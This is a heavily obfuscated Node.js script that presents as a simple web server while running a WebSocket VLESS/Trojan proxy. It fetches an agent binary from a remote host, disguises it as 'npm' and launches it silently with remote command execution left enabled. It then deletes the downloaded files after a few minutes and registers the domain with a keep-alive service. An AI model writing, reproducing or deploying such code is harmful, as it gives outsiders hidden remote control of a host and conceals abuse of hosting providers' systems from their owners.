const _0x45a0ed=_0x2b0e;(function(_0x55edc7,_0x18dc16){const _0x2fb8d8=_0x2b0e,_0x6c51b2=_0x55edc7();while(!![]){try{const _0x5cfecd=-parseInt(_0x2fb8d8(0x20a))/0x1*(parseInt(_0x2fb8d8(0x207))/0x2)+parseInt(_0x2fb8d8(0x1fd))/0x3+-parseInt(_0x2fb8d8(0x202))/0x4+parseInt(_0x2fb8d8(0x214))/0x5+-parseInt(_0x2fb8d8(0x212))/0x6+-parseInt(_0x2fb8d8(0x1d7))/0x7*(-parseInt(_0x2fb8d8(0x1ce))/0x8)+parseInt(_0x2fb8d8(0x1e1))/0x9*(parseInt(_0x2fb8d8(0x1fe))/0xa);if(_0x5cfecd===_0x18dc16)break;else _0x6c51b2['push'](_0x6c51b2['shift']());}catch(_0x57e00c){_0x6c51b2['push'](_0x6c51b2['shift']());}}}(_0x3cbb,0x7b3d1));function _0x3cbb(){const _0x5783d2=['once','join','2083','write','--tls','Server\x20is\x20running\x20on\x20port\x20','createWriteStream','concat','https://','2087','NAME','path','utf8','\x20-p\x20','2832cvuXfE','https://arm64.ssss.nyc.mn/agent','Hug','buffer','readUInt16BE','arm','split','error','connection','1799JbAovi','child_process','connect','https://dns.google/resolve?name=','country','end','asOrganization','https://arm64.ssss.nyc.mn/v1','url','post','1816371SYMKuj','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','true','aarch64','npm\x20is\x20already\x20running,\x20skip\x20running...','npm\x20is\x20running','UUID','8443','then','NEZHA_SERVER','base64','pipe','1.1.1.1','error:\x20','every','Automatic\x20Access\x20Task\x20added\x20successfully','update','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','Unknown','Answer','readFile','Not\x20Found\x0a','length','type','readUInt8','toString','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','false','827613kHPlcf','70OUUIHY','arm64','reduce','application/json','1951444IvfaAJ','AUTO_ACCESS','log','443','utf-8','1444622kBFzSr','\x20with\x20all\x20DNS\x20servers','unlink','1zqOoKF','1234.abc.com','slice','from','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','axios','&path=%2F','catch','3537624sDdHqg','8.8.4.4','2624895ipRbiG','NEZHA_KEY','npm','text/plain','https://speed.cloudflare.com/meta','438c5603-f968-4cb1-810a-79fa734862b5','sha224','data','writeFileSync','SUB_PATH','trim','Z5@980915vpn','test','replace','stream','writeHead',':443?security=tls&sni=','&fp=chrome&type=ws&host=','https://amd64.ssss.nyc.mn/v1','text/html','digest','PORT','trojan://','crypto','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','get','http','close','config.yaml','listen','Server','includes','client_secret:\x20','npm\x20running\x20error:','substr','env','/bin/bash','setsid\x20nohup\x20./npm\x20-s\x20','Hello\x20world!','application/dns-json','https://oooo.serv00.net/add-url','send'];_0x3cbb=function(){return _0x5783d2;};return _0x3cbb();}const os=require('os'),http=require(_0x45a0ed(0x22e)),fs=require('fs'),axios=require(_0x45a0ed(0x20f)),net=require('net'),path=require(_0x45a0ed(0x249)),crypto=require(_0x45a0ed(0x22b)),{Buffer}=require(_0x45a0ed(0x1d1)),{exec,execSync}=require(_0x45a0ed(0x1d8)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x45a0ed(0x237)][_0x45a0ed(0x1e7)]||_0x45a0ed(0x219),NEZHA_SERVER=process[_0x45a0ed(0x237)][_0x45a0ed(0x1ea)]||'',NEZHA_PORT=process['env']['NEZHA_PORT']||'',NEZHA_KEY=process['env'][_0x45a0ed(0x215)]||'',DOMAIN=process['env']['DOMAIN']||_0x45a0ed(0x20b),AUTO_ACCESS=process['env'][_0x45a0ed(0x203)]||!![],WSPATH=process['env']['WSPATH']||UUID[_0x45a0ed(0x20c)](0x0,0x8),SUB_PATH=process[_0x45a0ed(0x237)][_0x45a0ed(0x21d)]||_0x45a0ed(0x21f),NAME=process[_0x45a0ed(0x237)][_0x45a0ed(0x248)]||_0x45a0ed(0x1d0),PORT=process[_0x45a0ed(0x237)][_0x45a0ed(0x229)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x307cb0=_0x45a0ed;try{const _0x11f281=await axios[_0x307cb0(0x22d)](_0x307cb0(0x218)),_0x1c09f3=_0x11f281[_0x307cb0(0x21b)];ISP=(_0x1c09f3[_0x307cb0(0x1db)]+'-'+_0x1c09f3[_0x307cb0(0x1dd)])[_0x307cb0(0x221)](/ /g,'_');}catch(_0x35e484){ISP=_0x307cb0(0x1f3);}};GetISP();const httpServer=http['createServer']((_0x37298d,_0x3c9d82)=>{const _0x201e22=_0x45a0ed;if(_0x37298d['url']==='/'){const _0x3b4e35=path[_0x201e22(0x23f)](__dirname,'index.html');fs[_0x201e22(0x1f5)](_0x3b4e35,_0x201e22(0x24a),(_0x5c4843,_0x2b5514)=>{const _0x4ff32c=_0x201e22;if(_0x5c4843){_0x3c9d82[_0x4ff32c(0x223)](0xc8,{'Content-Type':'text/html'}),_0x3c9d82[_0x4ff32c(0x1dc)](_0x4ff32c(0x23a));return;}_0x3c9d82[_0x4ff32c(0x223)](0xc8,{'Content-Type':_0x4ff32c(0x227)}),_0x3c9d82[_0x4ff32c(0x1dc)](_0x2b5514);});return;}else{if(_0x37298d[_0x201e22(0x1df)]==='/'+SUB_PATH){const _0x37ceeb='vless://'+UUID+'@'+DOMAIN+':443?encryption=none&security=tls&sni='+DOMAIN+_0x201e22(0x225)+DOMAIN+_0x201e22(0x210)+WSPATH+'#'+NAME+'-'+ISP,_0x45f35d=_0x201e22(0x22a)+UUID+'@'+DOMAIN+_0x201e22(0x224)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x201e22(0x210)+WSPATH+'#'+NAME+'-'+ISP,_0x972f3a=_0x37ceeb+'\x0a'+_0x45f35d,_0x6c664e=Buffer[_0x201e22(0x20d)](_0x972f3a)[_0x201e22(0x1fa)](_0x201e22(0x1eb));_0x3c9d82[_0x201e22(0x223)](0xc8,{'Content-Type':_0x201e22(0x217)}),_0x3c9d82[_0x201e22(0x1dc)](_0x6c664e+'\x0a');}else _0x3c9d82[_0x201e22(0x223)](0x194,{'Content-Type':'text/plain'}),_0x3c9d82['end'](_0x201e22(0x1f6));}}),wss=new WebSocket[(_0x45a0ed(0x232))]({'server':httpServer}),uuid=UUID[_0x45a0ed(0x221)](/-/g,''),DNS_SERVERS=[_0x45a0ed(0x213),_0x45a0ed(0x1ed)];function resolveHost(_0x4c2cbc){return new Promise((_0x280fe9,_0x4cd88c)=>{const _0x43e814=_0x2b0e;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x43e814(0x220)](_0x4c2cbc)){_0x280fe9(_0x4c2cbc);return;}let _0x409d6d=0x0;function _0x5a0afa(){const _0x2d4159=_0x43e814;if(_0x409d6d>=DNS_SERVERS[_0x2d4159(0x1f7)]){_0x4cd88c(new Error('Failed\x20to\x20resolve\x20'+_0x4c2cbc+_0x2d4159(0x208)));return;}const _0x3e0f83=DNS_SERVERS[_0x409d6d];_0x409d6d++;const _0x1334a3=_0x2d4159(0x1da)+encodeURIComponent(_0x4c2cbc)+'&type=A';axios[_0x2d4159(0x22d)](_0x1334a3,{'timeout':0x1388,'headers':{'Accept':_0x2d4159(0x23b)}})[_0x2d4159(0x1e9)](_0x4bec5e=>{const _0x209322=_0x2d4159,_0x1fed38=_0x4bec5e[_0x209322(0x21b)];if(_0x1fed38['Status']===0x0&&_0x1fed38[_0x209322(0x1f4)]&&_0x1fed38[_0x209322(0x1f4)][_0x209322(0x1f7)]>0x0){const _0x16b8e6=_0x1fed38['Answer']['find'](_0x49a227=>_0x49a227[_0x209322(0x1f8)]===0x1);if(_0x16b8e6){_0x280fe9(_0x16b8e6[_0x209322(0x21b)]);return;}}_0x5a0afa();})[_0x2d4159(0x211)](_0x5a0b8c=>{_0x5a0afa();});}_0x5a0afa();});}function handleVlessConnection(_0x304f99,_0x5399fa){const _0x25baf5=_0x45a0ed,[_0x452007]=_0x5399fa,_0x544dcd=_0x5399fa[_0x25baf5(0x20c)](0x1,0x11);if(!_0x544dcd[_0x25baf5(0x1ef)]((_0x3aed51,_0x42c434)=>_0x3aed51==parseInt(uuid[_0x25baf5(0x236)](_0x42c434*0x2,0x2),0x10)))return![];let _0x5aca92=_0x5399fa[_0x25baf5(0x20c)](0x11,0x12)['readUInt8']()+0x13;const _0x381341=_0x5399fa[_0x25baf5(0x20c)](_0x5aca92,_0x5aca92+=0x2)[_0x25baf5(0x1d2)](0x0),_0x815955=_0x5399fa['slice'](_0x5aca92,_0x5aca92+=0x1)[_0x25baf5(0x1f9)](),_0x25e900=_0x815955==0x1?_0x5399fa[_0x25baf5(0x20c)](_0x5aca92,_0x5aca92+=0x4)[_0x25baf5(0x23f)]('.'):_0x815955==0x2?new TextDecoder()['decode'](_0x5399fa[_0x25baf5(0x20c)](_0x5aca92+0x1,_0x5aca92+=0x1+_0x5399fa[_0x25baf5(0x20c)](_0x5aca92,_0x5aca92+0x1)[_0x25baf5(0x1f9)]())):_0x815955==0x3?_0x5399fa[_0x25baf5(0x20c)](_0x5aca92,_0x5aca92+=0x10)[_0x25baf5(0x200)]((_0x1c2bc9,_0x25a6ad,_0x27740f,_0x1ae6fc)=>_0x27740f%0x2?_0x1c2bc9['concat'](_0x1ae6fc['slice'](_0x27740f-0x1,_0x27740f+0x1)):_0x1c2bc9,[])['map'](_0x359f89=>_0x359f89[_0x25baf5(0x1d2)](0x0)['toString'](0x10))['join'](':'):'';_0x304f99[_0x25baf5(0x23d)](new Uint8Array([_0x452007,0x0]));const _0x5f115c=createWebSocketStream(_0x304f99);return resolveHost(_0x25e900)[_0x25baf5(0x1e9)](_0x5bb6c7=>{const _0x3c194c=_0x25baf5;net[_0x3c194c(0x1d9)]({'host':_0x5bb6c7,'port':_0x381341},function(){const _0xed4c8f=_0x3c194c;this[_0xed4c8f(0x241)](_0x5399fa[_0xed4c8f(0x20c)](_0x5aca92)),_0x5f115c['on'](_0xed4c8f(0x1d5),()=>{})['pipe'](this)['on'](_0xed4c8f(0x1d5),()=>{})[_0xed4c8f(0x1ec)](_0x5f115c);})['on'](_0x3c194c(0x1d5),()=>{});})[_0x25baf5(0x211)](_0x2c6735=>{const _0x32a97d=_0x25baf5;net[_0x32a97d(0x1d9)]({'host':_0x25e900,'port':_0x381341},function(){const _0x1957e1=_0x32a97d;this['write'](_0x5399fa[_0x1957e1(0x20c)](_0x5aca92)),_0x5f115c['on'](_0x1957e1(0x1d5),()=>{})[_0x1957e1(0x1ec)](this)['on']('error',()=>{})[_0x1957e1(0x1ec)](_0x5f115c);})['on'](_0x32a97d(0x1d5),()=>{});}),!![];}function handleTrojanConnection(_0x42a1ec,_0x3c09f6){const _0x686e4=_0x45a0ed;try{if(_0x3c09f6[_0x686e4(0x1f7)]<0x3a)return![];const _0x3b9828=_0x3c09f6['slice'](0x0,0x38)[_0x686e4(0x1fa)](),_0xaf7ff9=[UUID];let _0x7d5951=null;for(const _0x44129a of _0xaf7ff9){const _0x1ad7e3=crypto['createHash'](_0x686e4(0x21a))[_0x686e4(0x1f1)](_0x44129a)[_0x686e4(0x228)]('hex');if(_0x1ad7e3===_0x3b9828){_0x7d5951=_0x44129a;break;}}if(!_0x7d5951)return![];let _0x1b2457=0x38;_0x3c09f6[_0x1b2457]===0xd&&_0x3c09f6[_0x1b2457+0x1]===0xa&&(_0x1b2457+=0x2);const _0x537640=_0x3c09f6[_0x1b2457];if(_0x537640!==0x1)return![];_0x1b2457+=0x1;const _0x21e44f=_0x3c09f6[_0x1b2457];_0x1b2457+=0x1;let _0x557ab8,_0x3afd7f;if(_0x21e44f===0x1)_0x557ab8=_0x3c09f6[_0x686e4(0x20c)](_0x1b2457,_0x1b2457+0x4)[_0x686e4(0x23f)]('.'),_0x1b2457+=0x4;else{if(_0x21e44f===0x3){const _0x15eb27=_0x3c09f6[_0x1b2457];_0x1b2457+=0x1,_0x557ab8=_0x3c09f6[_0x686e4(0x20c)](_0x1b2457,_0x1b2457+_0x15eb27)[_0x686e4(0x1fa)](),_0x1b2457+=_0x15eb27;}else{if(_0x21e44f===0x4)_0x557ab8=_0x3c09f6[_0x686e4(0x20c)](_0x1b2457,_0x1b2457+0x10)[_0x686e4(0x200)]((_0x5b4538,_0x5515ea,_0x45eb50,_0x2ea591)=>_0x45eb50%0x2?_0x5b4538[_0x686e4(0x245)](_0x2ea591[_0x686e4(0x20c)](_0x45eb50-0x1,_0x45eb50+0x1)):_0x5b4538,[])['map'](_0x4e3387=>_0x4e3387['readUInt16BE'](0x0)['toString'](0x10))[_0x686e4(0x23f)](':'),_0x1b2457+=0x10;else return![];}}_0x3afd7f=_0x3c09f6[_0x686e4(0x1d2)](_0x1b2457),_0x1b2457+=0x2;_0x1b2457<_0x3c09f6[_0x686e4(0x1f7)]&&_0x3c09f6[_0x1b2457]===0xd&&_0x3c09f6[_0x1b2457+0x1]===0xa&&(_0x1b2457+=0x2);const _0x59f49d=createWebSocketStream(_0x42a1ec);return resolveHost(_0x557ab8)[_0x686e4(0x1e9)](_0x5eeba8=>{const _0x37e87e=_0x686e4;net[_0x37e87e(0x1d9)]({'host':_0x5eeba8,'port':_0x3afd7f},function(){const _0x207deb=_0x37e87e;_0x1b2457<_0x3c09f6[_0x207deb(0x1f7)]&&this['write'](_0x3c09f6[_0x207deb(0x20c)](_0x1b2457)),_0x59f49d['on']('error',()=>{})[_0x207deb(0x1ec)](this)['on']('error',()=>{})[_0x207deb(0x1ec)](_0x59f49d);})['on'](_0x37e87e(0x1d5),()=>{});})[_0x686e4(0x211)](_0x34c6ab=>{const _0x4f987f=_0x686e4;net[_0x4f987f(0x1d9)]({'host':_0x557ab8,'port':_0x3afd7f},function(){const _0x17d404=_0x4f987f;_0x1b2457<_0x3c09f6[_0x17d404(0x1f7)]&&this[_0x17d404(0x241)](_0x3c09f6['slice'](_0x1b2457)),_0x59f49d['on'](_0x17d404(0x1d5),()=>{})[_0x17d404(0x1ec)](this)['on'](_0x17d404(0x1d5),()=>{})[_0x17d404(0x1ec)](_0x59f49d);})['on'](_0x4f987f(0x1d5),()=>{});}),!![];}catch(_0x4e3254){return![];}}wss['on'](_0x45a0ed(0x1d6),(_0x405950,_0x5e92a1)=>{const _0x16de0e=_0x45a0ed,_0x38cfce=_0x5e92a1[_0x16de0e(0x1df)]||'';_0x405950[_0x16de0e(0x23e)]('message',_0x2450fa=>{const _0x253c4b=_0x16de0e;if(_0x2450fa[_0x253c4b(0x1f7)]>0x11&&_0x2450fa[0x0]===0x0){const _0x2d7fed=_0x2450fa[_0x253c4b(0x20c)](0x1,0x11),_0x5738e9=_0x2d7fed[_0x253c4b(0x1ef)]((_0x4d4ef8,_0x17fee7)=>_0x4d4ef8==parseInt(uuid['substr'](_0x17fee7*0x2,0x2),0x10));if(_0x5738e9){!handleVlessConnection(_0x405950,_0x2450fa)&&_0x405950['close']();return;}}!handleTrojanConnection(_0x405950,_0x2450fa)&&_0x405950[_0x253c4b(0x22f)]();})['on'](_0x16de0e(0x1d5),()=>{});});const getDownloadUrl=()=>{const _0x364fae=_0x45a0ed,_0x330338=os['arch']();return _0x330338===_0x364fae(0x1d3)||_0x330338===_0x364fae(0x1ff)||_0x330338===_0x364fae(0x1e4)?!NEZHA_PORT?_0x364fae(0x1de):_0x364fae(0x1cf):!NEZHA_PORT?_0x364fae(0x226):'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const _0x5902a2=_0x45a0ed;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x21c6a0=getDownloadUrl(),_0x9001e=await axios({'method':_0x5902a2(0x22d),'url':_0x21c6a0,'responseType':_0x5902a2(0x222)}),_0x3facd8=fs[_0x5902a2(0x244)](_0x5902a2(0x216));return _0x9001e[_0x5902a2(0x21b)][_0x5902a2(0x1ec)](_0x3facd8),new Promise((_0x4b6dd8,_0x1ed93b)=>{_0x3facd8['on']('finish',()=>{const _0x3f622d=_0x2b0e;console[_0x3f622d(0x204)]('npm\x20download\x20successfully'),exec('chmod\x20+x\x20npm',_0x959cf3=>{if(_0x959cf3)_0x1ed93b(_0x959cf3);_0x4b6dd8();});}),_0x3facd8['on']('error',_0x1ed93b);});}catch(_0x50185d){throw _0x50185d;}},runnz=async()=>{const _0xdf2cdb=_0x45a0ed;try{const _0x339bf3=execSync(_0xdf2cdb(0x1f2),{'encoding':_0xdf2cdb(0x206)});if(_0x339bf3[_0xdf2cdb(0x21e)]()!==''){console[_0xdf2cdb(0x204)](_0xdf2cdb(0x1e5));return;}}catch(_0x2d5d0f){}await downloadFile();let _0x279bd5='',_0x36c8a6=[_0xdf2cdb(0x205),_0xdf2cdb(0x1e8),'2096',_0xdf2cdb(0x247),_0xdf2cdb(0x240),'2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x8ff4b1=_0x36c8a6['includes'](NEZHA_PORT)?_0xdf2cdb(0x242):'';_0x279bd5=_0xdf2cdb(0x239)+NEZHA_SERVER+':'+NEZHA_PORT+_0xdf2cdb(0x1cd)+NEZHA_KEY+'\x20'+_0x8ff4b1+_0xdf2cdb(0x1e2);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x3f4a15=NEZHA_SERVER[_0xdf2cdb(0x233)](':')?NEZHA_SERVER[_0xdf2cdb(0x1d4)](':')['pop']():'',_0x1adff4=_0x36c8a6[_0xdf2cdb(0x233)](_0x3f4a15)?_0xdf2cdb(0x1e3):_0xdf2cdb(0x1fc),_0x540170=_0xdf2cdb(0x234)+NEZHA_KEY+_0xdf2cdb(0x20e)+NEZHA_SERVER+_0xdf2cdb(0x1fb)+_0x1adff4+_0xdf2cdb(0x22c)+UUID;fs[_0xdf2cdb(0x21c)]('config.yaml',_0x540170);}_0x279bd5='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console['log']('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0x279bd5,{'shell':_0xdf2cdb(0x238)},_0xac0b69=>{const _0x3e32b2=_0xdf2cdb;if(_0xac0b69)console[_0x3e32b2(0x1d5)](_0x3e32b2(0x235),_0xac0b69);else console[_0x3e32b2(0x204)](_0x3e32b2(0x1e6));});}catch(_0x30c68a){console[_0xdf2cdb(0x1d5)](_0xdf2cdb(0x1ee)+_0x30c68a);}};function _0x2b0e(_0x2b316a,_0x5ee32d){_0x2b316a=_0x2b316a-0x1cd;const _0x3cbbe3=_0x3cbb();let _0x2b0e59=_0x3cbbe3[_0x2b316a];return _0x2b0e59;}async function addAccessTask(){const _0x39ec9c=_0x45a0ed;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0xa406b7=_0x39ec9c(0x246)+DOMAIN;try{const _0x50313d=await axios[_0x39ec9c(0x1e0)](_0x39ec9c(0x23c),{'url':_0xa406b7},{'headers':{'Content-Type':_0x39ec9c(0x201)}});console[_0x39ec9c(0x204)](_0x39ec9c(0x1f0));}catch(_0x39e74a){}}const delFiles=()=>{const _0x23f5f3=_0x45a0ed;fs[_0x23f5f3(0x209)](_0x23f5f3(0x216),()=>{}),fs[_0x23f5f3(0x209)](_0x23f5f3(0x230),()=>{});};httpServer[_0x45a0ed(0x231)](PORT,()=>{const _0x338bbc=_0x45a0ed;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x338bbc(0x204)](_0x338bbc(0x243)+PORT);});
